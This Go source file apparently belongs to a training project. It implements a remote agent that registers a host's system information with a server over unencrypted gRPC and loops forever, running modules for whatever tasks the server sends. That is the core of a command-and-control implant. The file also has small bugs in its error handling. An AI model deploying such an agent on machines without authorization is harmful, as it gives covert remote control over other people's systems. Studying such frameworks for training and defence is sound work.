package agent

import (
	"context"
	"errors"
	"fmt"
	"log"
	"time"

	"github.com/1stl0ve/avengercon/pkg/api"
	"github.com/1stl0ve/avengercon/pkg/module"
	"github.com/1stl0ve/avengercon/pkg/module/kill"
	"github.com/google/uuid"
	"google.golang.org/grpc"
)

// Agent is a program to run on a remote machine.
//
// Agent is a wrapper around an api.AgentClient, which provides the methods for
// using gRPC messages with the server.
type Agent struct {
	// an AgentClient is embedded within the Agent for gRPC functionality
	api.AgentClient

	// ID is a unique identifier (uuid) for the Agent instance
	ID *api.AgentID

	// config is configuration information about the Agent
	config Config

	// modules is alist of modules that this Agent was configured for
	modules map[string]module.Agent
}

// New creates a new instance of an Agent according to supplied configuration.
func New(config Config) (*Agent, error) {
	a := new(Agent)
	a.setHost(config.Host)
	a.setPort(config.Port)
	if err := a.setFetchFrequency(config.FetchFrequency); err != nil {
		return a, err
	}

	if err := a.connect(); err != nil {
		return a, err
	}

	a.ID = &api.AgentID{
		AgentID: uuid.New().String(),
	}
	a.modules = make(map[string]module.Agent)

	// the kill module is included in an agent by default.
	a.AddModule("kill", &kill.Agent{
		AgentClient: a.AgentClient,
	})
	return a, nil
}

// AddModule registers a module.Agent with this Agent.
func (a *Agent) AddModule(name string, m module.Agent) error {
	if _, found := a.modules[name]; found {
		return errors.New("module '%s' has already been registered")
	}
	a.modules[name] = m
	return nil
}

func (a *Agent) connect() error {
	// todo: we probably don't want to use grpc.WithInsecure() after this
	// project becomes better established.
	opts := []grpc.DialOption{grpc.WithInsecure()}
	conn, err := grpc.Dial(a.server(), opts...)
	if err != nil {
		return err
	}
	a.AgentClient = api.NewAgentClient(conn)
	return nil
}

func (a *Agent) handleTask(task *api.Task) error {
	id := task.GetAgentID()

	// if the command does not have an Agent associated with it, ignore it.
	if id == "" {
		return nil
	}

	// make sure that this Task was intended for this Agent
	if id != a.ID.GetAgentID() {
		return a.handleTaskError("wrong agent uuid")
	}

	// get the correct module for this task
	log.Printf("handling %s task\n", task.Name)
	mod, found := a.modules[task.Name]
	if !found {
		return a.handleTaskUnimplemented()
	}

	// execute the task
	if err := mod.Do(task); err != nil {
		return a.handleTaskError(err.Error())
	}

	// craft a response after completing the task
	resp, err := mod.CreateResponse(id)
	if err != nil {
		return a.handleTaskError(err.Error())
	}

	// send the response back to the server
	if _, err := a.SendResponse(context.Background(), resp); err != nil {
		return err
	}
	return nil
}

func (a *Agent) handleTaskUnimplemented() error {
	resp := &api.Response{
		AgentID: a.ID.GetAgentID(),
		Status:  api.Status_UNIMPLEMENTED,
	}
	_, err := a.AgentClient.SendResponse(context.Background(), resp)
	return err
}

// send a response with the 'Data' field set to a specified error message.
func (a *Agent) handleTaskError(msg string) error {
	resp := &api.Response{
		AgentID: a.ID.GetAgentID(),
		Status:  api.Status_ERROR,
		Data:    []byte(msg),
	}
	_, err := a.AgentClient.SendResponse(context.Background(), resp)
	return err
}

func (a *Agent) server() string {
	return fmt.Sprintf("%s:%d", a.host(), a.port())
}

// Run is the main command loop for the Agent. When the Agent starts running, it
// will register itself with the server and then enter an infinite loop waiting
// for new taks.
func (a *Agent) Run() error {
	var err error
	// register the Agent with the server
	ctx := context.Background()
	reg := &api.Registration{
		AgentID:  a.ID.GetAgentID(),
		Hostname: "hostname",
	}
	// populate the system information for this agent
	a.systemInfo(reg)

	if _, err := a.AgentClient.RegisterAgent(ctx, reg); err != nil {
		return err
	}
	// if the command loop breaks due to an error, unregister the agent
	defer a.AgentClient.UnregisterAgent(ctx, a.ID)

	for {
		cmd, err := a.AgentClient.GetTask(ctx, a.ID)
		if err != nil {
			log.Println(err)
			break
		}
		if err := a.handleTask(cmd); err != nil {
			log.Println(err)
		}
		// sleep until its time to fetch another command
		time.Sleep(a.config.fetchFrequencyDuration)
	}
	return err
}
